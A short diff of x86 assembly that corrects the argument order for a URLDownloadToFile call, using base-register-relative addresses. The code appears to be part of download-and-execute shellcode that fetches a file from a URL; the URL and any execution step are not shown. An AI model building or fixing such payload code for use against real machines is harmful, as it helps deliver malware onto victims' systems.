@@ -82,11 +82,11 @@ mov edx, ebx ; Moved back to be consistent
 
 lea esi, [EDX + URL]
 lea edi, [EDX + URLFILENAME]
-push 0x00 ; push pcaller
-push esi ; push szURL
-push edi ; push szFileName
-push 0x00 ; Reserver, must be 0
 push 0x00 ; push lpbindstatuscallback
+push 0x00 ; Reserver, must be 0
+push edi ; push szFileName
+push esi ; push szURL
+push 0x00 ; push pcaller
 call [EDX + URLDOWNLOADTOFILE]
 
 
